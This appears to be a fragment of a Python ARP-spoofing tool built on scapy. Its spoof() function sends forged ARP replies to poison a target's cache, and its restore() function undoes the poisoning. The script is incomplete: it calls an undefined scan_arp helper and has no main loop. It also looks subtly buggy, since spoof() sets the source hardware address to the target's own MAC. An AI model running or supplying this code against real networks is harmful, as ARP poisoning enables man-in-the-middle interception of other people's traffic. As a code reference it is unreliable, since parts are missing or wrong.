import scapy.all as scapy
import optparse
from time import sleep


def spoof(target_ip, spoof_ip):
    mac = scan_arp(target_ip)[0]['mac']
    packet = scapy.ARP(op=2, pdst=target_ip, hwsrc=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, spoof_ip):
    target_mac = scan_arp(target_ip)[0]['mac']
    spoof_mac = scan_arp(spoof_ip)[0]['mac']
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, count=4, verbose=False)


